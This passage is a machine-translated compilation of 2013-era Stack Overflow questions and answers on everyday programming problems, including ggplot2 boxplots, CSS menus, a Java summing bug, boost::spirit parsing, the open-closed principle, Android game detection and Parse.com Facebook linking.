    if( $inArray(e.which, [8, 37, 38, 39, 40])) return true; // If keycode = backspace, left, top, right, bottom array, than continue.

    var value = $('#message-input').val();

    if (value.length > 256) {
        alert('Túl hosszú az üzenet!');
        return false;
    }

    var remaining = 256 - value.length;
    $('#counter').text(remaining);

    return true;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T10:30:11.890

您可以删除最后一个字母以保持 256 个字符的长度，例如使用子字符串。

# r - Boxplot with ggplot2 in R - returns by month

> ID：15998043
> 
> 赞同：3
> 
> 时间：2013-04-14T10:28:14.637
> 
> 标签：r, ggplot2, time-series

I have computed monthly returns from a price series. I then build a dataframe as follows:

```
 y.ret_1981    y.ret_1982    y.ret_1983   y.ret_1984   y.ret_1985
1   0.0001015229  0.0030780203 -0.0052233836  0.017128325 -0.002427308
2   0.0005678989  0.0009249838 -0.0023294622 -0.030531971  0.001831160
3  -0.0019040392 -0.0021614791  0.0022451252 -0.003345983  0.005773503
4  -0.0006015118  0.0010695681  0.0052680258  0.008592513  0.009867972
5   0.0052736054 -0.0003181347 -0.0008505673 -0.000623061 -0.012225140
6   0.0014266119 -0.0101045071 -0.0003073150 -0.016084505 -0.005883687
7  -0.0069002733 -0.0078170620  0.0070058676 -0.007870294 -0.010265335
8  -0.0041963258  0.0039905142  0.0134996961 -0.002149331 -0.007860940
9   0.0020778541 -0.0038834826  0.0052289589  0.007271409 -0.005320848
10  0.0030956487 -0.0005027686 -0.0021452210  0.002502301 -0.001890657
11 -0.0032375542  0.0063916686  0.0009331531  0.004679741  0.004338580
12  0.0014882164  0.0039578527  0.0136663415  0.000000000  0.003807668 
```

... where columns are the monthly returns for the years 1981 to 1985 and the rows 1 to 12 are the months of the year.

I would like to plot a a boxplot similar to the one below:

![boxplot](https://i.stack.imgur.com/R4kzU.png)

So what can I go? And I would like my graph to read the months of the years instead of integer 1 to 12.

Thank you.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T10:43:40.317

首先，将新列添加到包含（R 中的内置常量）`month`的原始数据框中，并将其用作因子。`month.name`重要的是还要`levels=`在内部设置`factor()`以确保月份按时间顺序而不是字母顺序排列。

然后将这个数据帧从宽格式融合到长格式。`ggplot()`用作`month`x 值和`value`y 。

```
df$month<-factor(month.name,levels=month.name)
library(reshape2)
df.long<-melt(df,id.vars="month")
ggplot(df.long,aes(month,value))+geom_boxplot() 
```

![在此处输入图像描述](https://i.stack.imgur.com/07MiY.png)

# html - 广泛的子菜单

> ID：15998047
> 
> 赞同：0
> 
> 时间：2013-04-14T10:28:21.367
> 
> 标签：html, css, drop-down-menu, menu, submenu

实际上，我希望我的菜单类似于此网站[http://www.maxhealthcare.org](http://www.maxhealthcare.org)中的子菜单。

这是我的 HTML

```
<ul>
    <li><a href="#">Patient and Visitor Services</a></li>
    <li><a href="#">Hospital Network</a></li>
    <li><a href="#">Our Specialities</a>

        <ul>
            <p><span>Eye Care</span></p>
            <li><a href="<?=site_url('ourspeciality/ourspeciality_list_services')?>">List of Services</a></li>
            <li><a href="#">Team that cares</a></li>

            <p><span>Gasterology</span></p>
            <li><a href="#">List of Services</a></li>
            <li><a href="#">Team that cares</a></li>

            <p><span>General Surgery</span></p>
            <li><a href="#">List of Services</a></li>
            <li><a href="#">Team that cares</a></li>

            <p><span>Internal Medicine</span></p>
            <li><a href="#">List of Services</a></li>
            <li><a href="#">Team that cares</a></li>
        </ul>

    </li>
    <li><a href="#">Preventive Health Plans</a></li>
    <li><a href="#">For Medical Professionals</a></li>
</ul> 
```

和 CSS 是；

```
#menu ul
{
    margin:0px;
    padding:11px 150px;
    background-color:#013773;
    float:left;
    width:77.7%;
    list-style:none;
}
#menu ul li
{
height:100%;
width:auto;
margin:0px 5px;
padding:12px;   
cursor:pointer;
position:relative;
font-weight:bold;
color:#FFF;
font-size:15px;
}
#menu ul li:hover
{
background-color:#FFF;
color:#013773;
}
#menu ul li ul
{
display:none;
background-color:#FFF;
}
#menu ul li ul li
{
display:block;
width:90%;
position:relative;
color:inherit;
margin:0px;
font-weight:normal;
font-size:12px;
padding:0px;
}

#menu ul li:hover ul
{
display:block;
position:absolute;
margin:10px 0px;
padding:20px;
height:auto;
width:300px;
border-bottom:1px #CCC solid;
border-right:1px #CCC solid;
border-left:1px #CCC solid;
float:left;
}
#menu ul li:hover ul li
{
display:inline-block;
position:relative;
padding:10px;
font-weight:normal;
}
#menu ul li ul li:hover
{
font-weight:normal;
} 
```

在子菜单中，我将扩展我的菜单项，就像在示例网站中一样。有人可以告诉我该怎么做吗？

# java - ArrayList 元素没有正确总结

> ID：15998052
> 
> 赞同：0
> 
> 时间：2013-04-14T10:28:50.137
> 
> 标签：java, arraylist, sum

我有一个问题来总结我的`ArrayList`物品的公里数。

我已将变量初始化`doel2`为`0`. 当我第一次按下按钮并在`km`字段中写入时，`20`我得到了`20`，非常正确。`20`但是，当我随后在我的字段中填写时，`km`我得到了值`100`，但它必须是`40`.

我进入我的 Java 控制台：

```
file is created  
file closed  
20

file is created  
file is closed  
40  
60  
80  
100 
```

以下是该方法的代码：

```
public int NogAfTeLeggenKm(){ // methode om nog af te leggen km's te berekenen TODO
    for(Wandeldag w2:wandeldagLijst){
        try {
            doel2=doel2+Integer.valueOf(w2.getKilometer());
            System.out.println(doel2);
        }
        catch(NullPointerException e){
            System.out.println("probeer opnieuw");
        }
    }
    return doel2;
} 
```

这是我的代码`ActionListener`：

```
public class volgendeWandeldag implements ActionListener {
    @Override
    public void actionPerformed(ActionEvent e5) {
        Wandelaar.save();//save in text file
        int km = Integer.parseInt(tekstvakKilometer.getText());
        Wandeldag =  new Wandeldag(dag,maand,jaar,aantalUur,aantalMinuten,km); 
        Wandelaar.voegWandeldagToe(Wandeldag);
        JOptionPane.showMessageDialog(null,""+Wandelaar); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T10:59:26.123

如果您也包含其余代码（您的主要方法？），它可能会有所帮助。wandeldagLijst 来自哪里？还是万德拉天体？它们是如何初始化的。

此外，大多数人无法真正理解您的代码，因为所有单词都是荷兰语，如果他们看不懂，他们就无法帮助您。

根据我对您的代码的理解（我可以阅读荷兰语单词），我认为问题在于每次调用 NogAfTeLeggenKilometers() 时，它都会遍历 ArrayList 中的所有项目，以及那些已经在列表中的项目上次调用该方法时。这些项目将被计算为双倍，因为 'doel2' 对于此方法是全局的。结论：'doel2' 应该是一个局部变量。

```
public int NogAfTeLeggenKm(){ // methode om nog af te leggen km's te berekenen TODO
   int res = 0; 
   for(Wandeldag w2:wandeldagLijst){

       try {
           res=res+Integer.valueOf(w2.getKilometer());
           System.out.println(res);
       }
       catch(NullPointerException e){
           System.out.println("probeer opnieuw");
       }
   }
   return res;

} 
```

在你的主要方法中你应该这样做：

```
doel2 = NogAfTeLeggenKm(); 
```

另外：为什么要使用 try-catch 块来为变量赋值？

# c++ - boost::spirit::qi 置换解析器和综合属性

> ID：15998059
> 
> 赞同：2
> 
> 时间：2013-04-14T10:29:33.607
> 
> 标签：c++, boost, boost-spirit, boost-spirit-qi

我正在尝试将一个简单的命令行解析器与没有语义操作的 SPIRIT 组合在一起。我正在使用 BOOST 1.52，但我想避免使用 C++11 功能。该语法具有以下语法：

```
[-p num1] [-j] [--jobs num2] str1 str2 
```

可选参数可以按任何顺序排列。我只成功解析了可选参数。一旦我添加了额外的强制性两个字符串解析器，它就会中断。当我尝试显式写下“rstart”属性并避免使用“auto”进行类型推断时，它甚至会崩溃。非常感谢任何帮助或建议！

```
#include <iostream>
#include <string>
#include <vector>
#include <iterator>
#include <boost/spirit/include/qi.hpp>
#include <boost/optional.hpp>
#include <boost/fusion/include/boost_tuple.hpp>

bool parse_line( const std::string&str,bool useStart1 )
{
    bool rc=false;
    namespace qi = boost::spirit::qi;

    using boost::spirit::ascii::space_type;
    using boost::spirit::ascii::space;
    using boost::spirit::ascii::char_;

    std::string::const_iterator iter( str.begin() );

    std::size_t num1    =88;
    bool        bool1   =false;
    std::size_t num2    =88;
    std::string str1,str2;

    qi::rule< std::string::const_iterator,std::string() > rstring=+~space;
    qi::rule< std::string::const_iterator,std::size_t() ,space_type > 
        rOption1=qi::lit( "-p" ) >> qi::int_;
    qi::rule< std::string::const_iterator,bool()        ,space_type >
        rOption2=qi::lit( "-j" ) >> qi::attr(true);
    qi::rule< std::string::const_iterator,std::size_t() ,space_type >
        rOption3=qi::lit( "--jobs" ) >> qi::int_;

#if defined(AAA)
    qi::rule<   std::string::const_iterator,
                boost::spirit::ascii::space_type,
                boost::tuple<   boost::optional<std::size_t>,
                                boost::optional<bool>,
                                boost::optional<std::size_t >
                >
            >
#endif

    auto rstart1 = ( rOption1 ^ rOption2 ^ rOption3 ) ;
    auto rstart2 = ( rOption1 ^ rOption2 ^ rOption3 ) >> rstring >> rstring;

    if( useStart1 )
        qi::phrase_parse( iter,str.end(),
            ( qi::lit( "-p" ) >> qi::int_ ) ^
            ( qi::lit( "-j" ) >> qi::attr(true) ) ^
            ( qi::lit( "--jobs" ) >> qi::int_ ),space,num1,bool1,num2);
    else
    {
    //  qi::phrase_parse(
    //      iter,str.end(),rstart2,space,num1,bool1,num2,str1,str2);
    }

    if(iter==str.begin())
        iter=str.begin(); //NOP
    else
    if(iter!=str.end())
        std::cerr<<"syntax error: "<<std::string(iter,str.end())<<"!\n\n";
    else
        rc=true;

    std::cout << "num1:" << num1 << std::endl;
    std::cout << "bool1:"<< bool1  << std::endl;
    std::cout << "num2:" << num2 << std::endl;
    std::cout << "str1:" << str1 << std::endl;
    std::cout << "str2:" << str2 << std::endl;

    return rc;
}

int main( int argc,char**argv )
{
    std::vector< std::string > testData1;
    testData1.push_back( "-p 100 -j" );
    testData1.push_back( "-j -p 100 --jobs 16" );
    testData1.push_back( "--jobs 16 -j -p 100" );

    for( std::vector< std::string >::const_iterator it=testData1.begin();
         it!=testData1.end(); ++it )
    {
        std::cout << "\nparsing string:" << *it << std::endl;
        parse_line( *it,true );
    }

    std::vector< std::string > testData2;
    testData2.push_back( "-p 100 -j ifile ofile" );
    testData2.push_back( "-j -p 100 --jobs 16 ifile ofile" );
    testData2.push_back( "--jobs 16 -j -p 100 ifile ofile" );

    for( std::vector< std::string >::const_iterator it=testData2.begin();
         it!=testData2.end(); ++it )
    {
        std::cout << "\nparsing string:" << *it << std::endl;
        parse_line( *it,false );
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T16:54:41.913

您面临的问题是您的组合规则的属性基本上是：

```
tuple< tuple<size_t,bool,size_t>, std::string, std::string > 
```

并通过将变量一一放在对phrase_parse的调用中，您基本上可以：

```
tuple< size_t, bool, size_t, std::string, std::string > 
```

由于属性传播在精神上的工作方式，这就是正在发生的事情：

整个`tuple<size_t,bool,size_t>`分配给您的 num1（忽略 bool 和第二个 size_t），之后该精神尝试将第一个字符串分配给您的 bool，从而导致您遇到错误。

我相信解决这个问题的最简洁的方法是创建一个自定义结构来保存反映规则结构的结果。

```
#include <iostream>
#include <string>
#include <vector>
#include <iterator>
#include <boost/spirit/include/qi.hpp>
#include <boost/fusion/include/adapt_struct.hpp>

struct optional_command_line_options
{
   int num1;
    bool bool1;
    int num2;
};

struct command_line_options
{
    optional_command_line_options opt;
    std::string str1;
    std::string str2;
};

BOOST_FUSION_ADAPT_STRUCT(
    optional_command_line_options,
    (int, num1)
    (bool, bool1)
    (int, num2)
)

BOOST_FUSION_ADAPT_STRUCT(
    command_line_options,
    (optional_command_line_options, opt)
    (std::string, str1)
    (std::string, str2)
)

bool parse_line( const std::string&str )
{
    bool rc=false;
    namespace qi = boost::spirit::qi;

    using boost::spirit::ascii::space;
    using boost::spirit::ascii::char_;

    std::string::const_iterator iter( str.begin() );

    command_line_options options;
    options.opt.num1=88;
    options.opt.bool1=false;
    options.opt.num2=88;

    qi::rule< std::string::const_iterator, std::string() > rstring=+~space;

    qi::rule<std::string::const_iterator, boost::spirit::ascii::space_type,optional_command_line_options() >  trule; 
    trule=
        ( qi::lit( "-p" ) >> qi::int_ ) ^
        ( qi::lit( "-j" ) >> qi::attr(true) ) ^
        ( qi::lit( "--jobs" ) >> qi::int_ )
        ;

    qi::rule< std::string::const_iterator, boost::spirit::ascii::space_type, command_line_options() >arule;
    arule = -trule >> rstring >> rstring;

    bool result=qi::phrase_parse( iter,str.end(),
                                 arule,
                                 space,
                                 options
    );

    if(result && iter==str.end())
    {
        std::cout << "Parse successful." << std::endl;
        rc=true;
    }
    else
    {
        std::cerr<<"syntax error: "<<std::string(iter,str.end())<<"!\n\n";
    }

     std::cout << std::boolalpha;
    std::cout << "num1:" << options.opt.num1 << std::endl;
    std::cout << "bool1:"<< options.opt.bool1  << std::endl;
    std::cout << "num2:" << options.opt.num2 << std::endl;
    std::cout << "str1:" << options.str1 << std::endl;
    std::cout << "str2:" << options.str2 << std::endl;

    return rc;
}

int main( int /*argc*/,char**/*argv*/ )
{
    std::vector< std::string > testData;
    testData.push_back( "-p 100 -j ifile ofile" );
    testData.push_back( "-j -p 100 --jobs 16 ifile ofile" );
    testData.push_back( "--jobs 16 -j -p 100 ifile ofile" );
     testData.push_back( "--jobs 16 -p 100 ifile ofile" );
     testData.push_back( "ifile ofile" );

    for( std::vector< std::string >::const_iterator it=testData.begin();
         it!=testData.end(); ++it )
    {
        std::cout << "\nparsing string:" << *it << std::endl;
        parse_line( *it );
    }

    return 0;
} 
```

[在 LWS 上运行](http://liveworkspace.org/code/2CxvWm%240)。

PS：如果不使用 boost::proto::deep_copy，则不能直接分配给使用`auto`嵌入文字（例如字符串或数字）声明的规则；

```
auto trule = boost::proto::deep_copy(qi::lit( "-p" ) >> qi::int_); 
```

有一个名为 BOOST_SPIRIT_AUTO 的宏使它更易于使用：

```
#define BOOST_SPIRIT_AUTO(domain_, name, expr)                                  \
    typedef boost::proto::result_of::                                           \
        deep_copy<BOOST_TYPEOF(expr)>::type name##_expr_type;                   \
    BOOST_SPIRIT_ASSERT_MATCH(                                                  \
        boost::spirit::domain_::domain, name##_expr_type);                      \
    BOOST_AUTO(name, boost::proto::deep_copy(expr));

BOOST_SPIRIT_AUTO(qi,trule,qi::lit( "-p" ) >> qi::int_); 
```

# vb.net - 返回页面并在后面的代码中添加控件时出错

> ID：15998060
> 
> 赞同：0
> 
> 时间：2013-04-14T10:29:33.893
> 
> 标签：vb.net, windows-phone-7, xaml

在我的 Windows Phone 应用程序 (VB/XAML) 中，我在*返回页面时*无法在代码中创建 XAML 控件。

基本上我的页面在崩溃时试图做的是基于数据上下文创建一些控件。控件一开始是正确创建的，然后当页面离开并返回到控件时将不再创建（无论是否使用相同的数据对象来填充页面）。这是崩溃的行：

```
ItemStack1.Children.Add(AnswerPanel1) 
```

我只是得到一个通用的“System.InvalidOperationException”错误。

我已经检查到那时一切都如我所料 - 无论页面如何导航到，数据对象都正确填充。我还尝试通过在尝试添加之前删除 AnswerPanel1 项目来缩小问题范围。我怀疑该应用程序正在“记住”上次打开页面时的页面，这导致我“加倍”了一些东西。

如果我在这一行周围使用“Try...Catch”，则页面中缺少控件（对我而言，这意味着控件不存在，我认为这是（重新）创建它第二次失败的原因。

我用这个导航到页面：

```
NavigationService.Navigate("/CasebookSelectCasePage.xaml", sItem) 
```

...它使用一个小“助手”类来传递 sItem 对象，但在类中它可以正常导航，如下所示：

```
 service.Navigate(New Uri(page, UriKind.Relative)) 
```

我想我遗漏了一些基本的或明显的东西......当向后导航到首页时，我是否需要将页面“刷新”出内存？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T19:45:33.220

When do you try to create your controls exactly? Are you creating them in OnNavigatedTo() or in Page_Loaded() ? It's not the same in which you try to create your objects.

# javascript - How to find all possible CSS Styles and Attributes of an Element?

> ID：15998061
> 
> 赞同：2
> 
> 时间：2013-04-14T10:29:37.090
> 
> 标签：javascript, jquery, css, dom

There are some ways to get all CSS styles of a DOM Element that are set with style or class Attribute. This works great, but if the class is not set to this it's not possible to find the classes that could be set to this element.

Now I'm looking for a way to get all CSS Classes and Styles that could be possible set to this DOM Element. I've tried something with RegExp but it's not perfect because I'm not sure how to search the document Style Node and compare it with the DOM Node. How is that possible?

Example what i need:

```
<div class="set">
  <p class="anotherclass">some text</p>
  <p class="otherClass">some text</p>
</div> 
```

the css:

```
div.set { /* some css */ }
div.notSet { /* you could find me but not want to set me */ }
.autoSet_findMeToSet { /* set me to all tags with jquery */ }
div.autoSet_setMeNow { /* set me to the div tag with jquery */ }
div > p:first-child.autoSet_yeah { /* set me to the first p tag with jquery */
/* and so on */ 
```

As you can see I want to set with jQuery all css classes with special names. With regexp I could find the class names but I don't know how to check to which dom element (html tag) it needs to be set...

thanks for help at all!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:42:41.483

如果我理解正确的问题：

```
$(".class *") 
```

选择具有类的元素内的所有元素`class`

```
$(".class").find(element).length === 0 
```

检查元素是否在具有类的元素内`class`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:13:00.037

您可以使用 jQuery $.contains() 检查找到的元素是否在其他元素中

更多信息在这里如何做到这一点：http: [//api.jquery.com/jQuery.contains/](http://api.jquery.com/jQuery.contains/)

因此，对于您的示例，要查找某些找到的类是否在集合内，您可以执行以下操作：

```
$.each(foundElement, function(index, domElement){
    if($.contains(domElement, $('.set'))) {
        // domElement is inside the container with 'set' class
    } else {
        // domElement is not inside the container with 'set' class
    }
}); 
```

# c# - 拖放处理程序之前的树视图拖放

> ID：15998067
> 
> 赞同：1
> 
> 时间：2013-04-14T10:30:07.717
> 
> 标签：c#, asp.net-mvc, razor, ext.net

我正在尝试在树面板中执行拖放事件，但有一些限制。我有两个树视图，我需要将右树的内容拖到左树，但有一些限制。1）我需要检查拖动的项目是否在左树上。如果是，则不允许任务完成 2）如果拖动的项目有子节点，则应显示有关具有子节点的节点的通知。如果用户单击是，它应该允许复制所有节点，如果不是，它应该只允许父节点

我在javascript中编写了如下代码（注意我使用剃刀作为用户界面）

```
function (node, data, overModel, dropPosition, dropFunction) {

var record = data.records[0].data;

var nodeElem = data.item;
//before dropping item to the destination tree view we have to check if the item already exists

var exists = (nodeElem.find('.completed').length > 0);
if(exists)
{
    return false;
}
    //validate hierarchy level and parent node
var target = overModel;
//target.parentNode.data.id
var depth=target.getDepth();

if ( depth > 1) {
    if (target.data.id != record.parentId) {
        return false;
    }
}
//check for existing nodes
var destTree = Ext.getCmp('tpDestination');
var found = findChildNodes(record.id, destTree);//dind childnodes checks the presence of chiild node
if (found) {
    Ext.Msg.alert({
        title: 'Alert',
        msg: "The destination tree contains one of it's child domain. Please remove it's children and retry.",
        buttons: Ext.MessageBox.OK
    });
    return false;
}
//allow copy of nodes. it overrides the move functionality
data.copy = true;
//show the confirmation message, if the node has children.
var isLeaf = record.leaf;
if (!isLeaf) {
    //wait until confirmation complete
    dropFunction.wait = true;
    Ext.Msg.confirm({
        title: 'Confirm',
        msg: "Do you want to copy children also?",
        buttons: Ext.MessageBox.YESNO,
        fn: function (btn) {
            if (btn == 'no') {
                data.copyChildren = false;
            }
            dropFunction.processDrop();
        }
    });
}

data.dropNode = data.records[0];

return true; }; 
```

完成是右侧面板的节点类，代码应该检查拖动的元素是否存在已完成的类，但它不工作，当用户单击“否”时我不知道它仍然沿子节点添加所有节点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T06:27:01.893

这是 Ext.NET 论坛上的相关讨论：
[http ://forums.ext.net/showthread.php?24387](http://forums.ext.net/showthread.php?24387)

# c# - 超越开闭原则

> ID：15998071
> 
> 赞同：7
> 
> 时间：2013-04-14T10:30:30.720
> 
> 标签：c#, open-closed-principle

我有一个简单的程序，它根据用户提供的鼠标数据绘制几何图形。我有一个处理鼠标跟踪的类（它获取带有鼠标移动历史的列表）和一个名为 Shape 的抽象类。从这个类中，我派生了一些额外的形状，如圆形、矩形等——它们中的每一个都覆盖了抽象的 Draw() 函数。

这一切都很好，但是当我希望用户能够手动切换所需的形状时问题就来了。我得到了鼠标数据，我知道我应该画什么形状。问题是如何让代码“知道”它应该创建哪个对象并将适当的参数传递给构造函数。此时也无法添加新的 Shape 导数，这显然是错误的。

我显然不想提供如下代码：

```
List<Shape> Shapes = new List<Shape>();
// somwhere later 

if(CurrentShape == "polyline"){
    Shapes.Add(new Polyline(Points)); 
}
else if (CurrentShape == "rectangle"){
    Shapes.Add(new Rectangle(BeginPoint, EndPoint));
}
// and so on. 
```

上面的代码显然违背了开闭原则。问题是我不知道如何克服它。主要的问题是不同的Shape有不同参数的构造函数，这就麻烦多了。

我很确定这是一个常见问题，但我不知道如何解决它。你有什么想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T10:45:48.110

当您需要创建全部派生自一个类或实现相同接口的对象时，一种常见的方法是使用[*工厂*](http://en.wikipedia.org/wiki/Factory_method_pattern)。但是，在您的情况下，简单的工厂可能还不够，因为工厂本身需要可扩展。

一种实现方式如下：

```
interface IShapeMaker {
    IShape Make(IList<Point> points);
}
class RectMaker : IShapeMaker {
    public Make(IList<Point> points) {
        // Check if the points are good to make a rectangle
        ...
        if (pointsAreGoodForRectangle) {
            return new Rectangle(...);
        }
        return null; // Cannot make a rectangle
    }
}
class PolylineMaker : IShapeMaker {
    public Make(IList<Point> points) {
        // Check if the points are good to make a polyline
        ...
        if (pointsAreGoodForPolyline) {
            return new Polyline(...);
        }
        return null; // Cannot make a polyline
    }
} 
```

有了这些`Maker`类，您可以创建一个制造商注册表（一个简单的`List<IShapeMaker>`），通过制造商向他们传递点，并在您返回非空形状时停止。

该系统保持可扩展性，因为您可以添加一对`NewShape`and `NewShapeMaker`，并将它们“插入”到现有框架中：一旦`NewShapeMaker`进入注册表，系统的其余部分立即准备好识别和使用您的`NewShape`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-14T10:50:16.640

它乞求一个工厂，但不仅仅是工厂，而是有注射工人的工厂。

```
public class Context {
   public Point BeginPoint;
   public Point EndPoint;
   public List Points;

   whatever else
}

public class ShapeFactory {

   List<FactoryWorker> workers;

   public Shape CreateShape( string ShapeName, Context context )
   {
      foreach ( FactoryWorker worker in workers )
         if ( worker.Accepts( ShapeName ) )
             return worker.CreateShape( context );
   }

   public void AddWorker( FactoryWorker worker ) {
      workers.Add( worker );
   }
 }

 public abstract class FactortWorker {
    public abstract bool Accepts( string ShapeName );
    puboic Shape CreateShape( Context context );
 }

 public class PolyLineFactoryWorker : FactoryWorker {

    public override bool Accepts( string ShapeName ) {
       return ShapeName == "polyline";
    }

    public Shape CreateShape( Context context ) { ... }

 } 
```

这样代码就可以扩展了——可以自由地创建新的工厂工人并将其添加到工厂中。

# javascript - 关于文本对齐

> ID：15998079
> 
> 赞同：0
> 
> 时间：2013-04-14T10:31:33.683
> 
> 标签：javascript, text, onclick, alignment

最近在一个网站上工作，并想对其进行调整，以便在图片后面加上右侧的文字给出简要说明。

```
 <script type="text/javascript">
    function gotofirst()
    {
    alert('This link will be replaced with the appropiate link');
    window.open('http://google.com');
    }
</script>

<tr>
    <td>
        <img src="images/poster2.jpg" onClick="gotosecond()">
    </td>
    <p id="forum">Join us on our forums, chat with staff members and much more!</p>

</tr> 
```

CSS：

```
#forum
{
font-size: 13px;
} 
```

然后让 CSS 文件右对齐。问题是图像被推下并且文本没有挤在提供的框中，而是在我想要它向右时在图像上方右对齐。

jsFiddle 链接：http: [//jsfiddle.net/HCVVp/](http://jsfiddle.net/HCVVp/)

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T10:51:46.730

我建议您尽可能不要使用元素。我认为你可以这样做：

HTML

```
<div id="content">
    <div class="left">
        <img src="images/poster2.jpg" onClick="gotosecond()">
    </div>
    <div class="right">
        <p id="forum">Join us on our forums, chat with staff members and much more!</p>
    </div>
</div> 
```

CSS：

```
#content{
    position: relative;
    width: 500px;
    margin:0 auto;
}
.left{float:left;}
.right{float:right} 
```

另一种解决方案是删除 div 并将`.left`and`.right`类仅应用于`<img>`and`<p>`元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T10:42:28.627

```
<tr>
    <td>
        <img src="images/poster2.jpg" onClick="gotosecond()" style="float:left;display:block">
        <p id="forum" style="float:right">Join us on our forums, chat with staff members and much more!</p>
    </td>
</tr> 
```

如果它仍然不起作用，请尝试包装在 div 中

```
<tr>
        <td>
           <div>
            <img src="images/poster2.jpg" onClick="gotosecond()" style="float:left;display:block">
            <p id="forum" style="float:right">Join us on our forums, chat with staff members and much more!</p>
            </div>
        </td>
    </tr> 
```

# html - 给动态生成的画布唯一ID

> ID：15998080
> 
> 赞同：0
> 
> 时间：2013-04-14T10:31:45.020
> 
> 标签：html, html5-canvas

```
var canvas = document.createElement('canvas'), canvasContext = canvas.getContext('2d');
canvas.width = image.width;
canvas.height = image.height;
canvas.id = ;
canvasContext.drawImage(image, 0, 0);
container.append(canvas); 
```

我怎样才能给我所有生成的画布的唯一 ID

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T21:51:01.603

你不能只添加一个计数器吗？：

```
var counter = 0;
...
canvas.id = 'something_' + counter;
...
counter++: 
```

或者对你来说是*独一无二*的？

# android - 如何检测android应用程序是否是游戏？

> ID：15998081
> 
> 赞同：3
> 
> 时间：2013-04-14T10:31:47.890
> 
> 标签：android

在我正在开发的应用程序中，我需要遍历已安装的应用程序并检测哪些是游戏。有没有办法做到这一点？

我正在考虑一个可以搜索包名称并返回其类别的 Play Store API，即使它仅限于商店中的应用程序。是否存在类似的东西？这有没有可能？

有没有其他方法可以做到这一点？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-02-27T09:15:46.840

**此答案已弃用！**
正确和向后兼容的方法就[在这里](https://stackoverflow.com/a/31600301/2112557)！

从 Android API 版本 21 开始，终于有一种方法可以检查应用程序是否为游戏。

```
PackageManager pm = mContext.getPackageManager();
ApplicationInfo ai = pm.getApplicationInfo(mPackageName,0);
if((ai.flags & ApplicationInfo.FLAG_IS_GAME) == ApplicationInfo.FLAG_IS_GAME)
    return true;
return false; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-14T10:34:10.027

没有自动检测应用程序是否为游戏的方法。您只需比较包名的公共部分的包名即可。我的解决方案是索引谷歌商店页面并散列包名称。

我可以通过构建通用前缀来优化我的哈希值。我将包名称作为域处理并grep公共后缀。我使用来自[http://publicsuffix.org/](http://publicsuffix.org/)的列表。

> “公共后缀”是互联网用户可以直接注册姓名的后缀。公共后缀的一些示例是 .com、.co.uk 和 pvt.k12.ma.us。公共后缀列表是所有已知公共后缀的列表。
> 
> 公共后缀列表是 Mozilla 的一项倡议，但作为社区资源进行维护。它可用于任何软件，但最初是为了满足浏览器制造商的需求而创建的。

使用此列表，您可以检测包名的一部分是公共前缀。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-06-17T08:16:13.817

对我来说，上面的答案不起作用， ApplicationInfo.FLAG_IS_GAME 现在已弃用，使用 API 28+（在我的情况下），您可以执行以下操作：

```
_pm = _context.PackageManager;
List<string> packageList = new List<string>();
Intent intent = new Intent(Intent.ActionMain);
intent.AddCategory(Intent.CategoryLeanbackLauncher); // or add any category you want
var list = _pm.QueryIntentActivities(intent, PackageInfoFlags.MetaData);
foreach (var app in list)
{
    ApplicationInfo ai = _pm.GetApplicationInfo(app.ActivityInfo.PackageName, 0);
    var allFlags = ai.Flags;

    if (allFlags.HasFlag(ApplicationInfoFlags.IsGame))
    {
        packageList.Add(app.ActivityInfo.PackageName);
    }
} 
```

# parse-platform - Parse.com - 另一个用户已经链接到这个 facebook id

> ID：15998084
> 
> 赞同：8
> 
> 时间：2013-04-14T10:32:28.897
> 
> 标签：parse-platform

我正在使用 parse.com 的 api 并尝试将当前活跃的用户链接到他的 facebook 帐户。

我一直在胡说八道：

```
Another user is already linked to this facebook id 
```

至于我的问题：如何获取用户连接的 facebook id？我想用活动和登录用户切换我当前的匿名用户。

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-28T12:15:41.167

我通过注销当前用户然后登录解决了这个问题。效果很好。

```
[PFFacebookUtils linkUser:[PFUser currentUser] permissions:permissionsArray block:^(BOOL success, NSError *error) {
    if (!success) {
        if (!error) {
            NSLog(@"User Cancelled");
        } else {
            if(error.code == 208) {
                [PFUser logOut];
                [PFFacebookUtils logInWithPermissions:permissionsArray block:^(PFUser *user, NSError *error) {
                    if(error) {
                        NSLog(@"An error occurred: %@", error);
                    } else {
                        // Carry on
                    }
                }];
            } else {
                NSLog(@"An error occurred: %@", error);
            }
        }
    } else {
        // Carry on
    }
}]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-23T03:18:15.853

您可以忽略它，因为它是通知您 Facebook 帐户已链接（在您的情况下是匿名用户）的警告，而不是错误。

最后分配的用户将链接到 Facebook 帐户。因此，即使会发出警告以通知您匿名用户已链接到同一个 facebook 帐户，您的初衷 - “将当前活跃的用户链接到他的 facebook 帐户”仍然有效。

为避免此警告，请始终在将 Facebook 用户与当前活动用户关联之前注销匿名用户。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-16T20:29:27.643

我遇到了同样的问题，解决方案更好，忽略这个错误。这是一种警告。它被抛出，但用户被链接到另一个帐户。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-01-28T10:17:13.707

当您尝试像这样链接时，检查您是否在请求权限：

```
[PFFacebookUtils linkUser:[PFUser currentUser] permissions:[NSArray arrayWithObjects:@"publish_stream",@"publish_actions", @"user_about_me", @"user_photos", @"read_stream",@"friends_photos",@"email",@"user_birthday",@"user_location", nil] block:^(BOOL succeeded, NSError *error) {
            if (succeeded) {
                [self login:nil];
